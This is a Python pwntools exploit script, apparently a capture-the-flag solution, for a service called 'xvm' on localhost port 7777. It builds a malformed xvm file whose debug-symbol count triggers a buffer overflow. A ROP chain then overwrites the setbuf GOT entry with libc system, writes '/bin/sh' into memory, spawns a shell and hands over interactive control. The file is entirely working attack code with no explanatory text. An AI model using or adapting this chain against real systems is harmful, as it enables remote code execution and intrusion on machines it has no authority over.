import pwn
import ctypes
import struct
import time

from pwnlib.rop import gadgets


exe = pwn.ELF("./xvm")
libc = pwn.ELF("./libc.so.6")
# libc = exe.libc

p = pwn.remote("localhost", 7777)

n_dbgsyms = 0x40
n_sections = 1
payload = pwn.p32(0x36D7678)  # xvm header
payload += pwn.p32(0x13371000)  # xvm entry_point
payload += pwn.p32(n_dbgsyms)  # dbgsyms (triggers buffer overflow)
payload += pwn.p32(0)  # file size
payload += pwn.p32(n_sections)  # nsections

rop = pwn.ROP(exe)
gadget_3d = next(exe.search(b"\x01\x5d\xc3\x90\xc3"))
pop_rbp = gadget_3d + 1
pop_rbx = next(exe.search(b"\x5b\xc3"))

chain = b""
chain += pwn.p64(pop_rbp)
chain += pwn.p64(exe.got["setbuf"] + 0x3D)
chain += pwn.p64(pop_rbx)
chain += pwn.p64((libc.symbols["system"] - libc.symbols["setbuf"]) & 0xFFFFFFFF)
chain += pwn.p64(gadget_3d)

chain += pwn.p64(pop_rbp)
chain += pwn.p64(0x40C138 + 0x3D)
chain += pwn.p64(pop_rbx)
chain += pwn.p64((pwn.u64(b"/bin/sh\x00")) & 0xFFFFFFFF)
chain += pwn.p64(gadget_3d)

chain += pwn.p64(pop_rbp)
chain += pwn.p64(0x40C138 + 4 + 0x3D)
chain += pwn.p64(pop_rbx)
chain += pwn.p64((pwn.u64(b"/bin/sh\x00") >> 32) & 0xFFFFFFFF)
chain += pwn.p64(gadget_3d)


# rax = 0x40C138
chain += pwn.p64(0x4012C0)
chain += pwn.p64(0x4013B1)

chain += pwn.p64(0x13371337)

r_chain = pwn.flat(
    {0xE * 8: pwn.p64(0), 0x13 * 8: pwn.p32(0x13), 0x15 * 8: chain},
    length=n_dbgsyms * 8,
)

payload += r_chain

for i in range(n_sections):
    payload += pwn.p32(0xDEADBEEF)
    payload += b".data\x00"
    payload += pwn.p32(0x1000)  # section_size
    payload += pwn.p32(0xF00DB000)  # section_addr
    payload += pwn.p32(0)  # section_flags
    payload += pwn.p32(0)  # section_index


p.sendlineafter(b"> ", b"1")
p.sendlineafter(b": ", b"%d" % len(payload))
p.sendafter(b": ", payload)
p.recvuntil(b"Token: ")
token = p.recvline().strip()
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b": ", token)


p.interactive()
